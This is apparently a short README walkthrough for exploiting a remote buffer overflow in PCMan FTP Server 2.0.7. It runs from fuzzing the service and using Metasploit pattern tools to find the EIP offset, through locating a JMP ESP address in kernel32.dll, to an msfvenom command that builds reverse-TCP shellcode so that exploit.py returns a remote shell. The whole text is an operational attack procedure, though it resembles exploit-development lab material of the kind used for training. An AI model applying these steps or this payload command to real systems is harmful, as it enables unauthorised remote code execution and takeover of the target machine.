PCMan FTP Server 2.0.7 - Remote Buffer Overflow 2013-4730 

1) Run fuzzer.py (take note of bytes sent when program crashing, eg: `6000`)
2) Create a pattern with: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6000 > offset.txt
3) Edit offset.py accordly and then run it. Take note when program crashing the EIP address, eg: `43396F43`
4) Create a pattern offset with: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 43396F4 . Take note of the exact match, eg: `2007`
5) Copy the offset.py to precise_offset.py and edit accordly with exact offset value just discovered before. Run it and check if EIP now contains `42424242` our `B`
6) Now restart the program again and take note of the jump point: click on letter `e` (Executable modules)  on Immunity Menu and select with double click kernel32.dll. Then on CPU main thread module kernel32 window, take note of the JMP ESP, eg: `7C86467B` 
7) Now copy precise_offset.py to exploit.py edit accordly with the JMP ESP address obtained, remember to report it BACKWARDS (little endian!).
8) Create a shellcode with msfvenom, like: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=6666 -b '\x00\x0a\x0d\xff' -f c
9) Take note of the shellcode and put the shellcode in right variable in exploit.py. Run the exploit.py it should receive a shell !


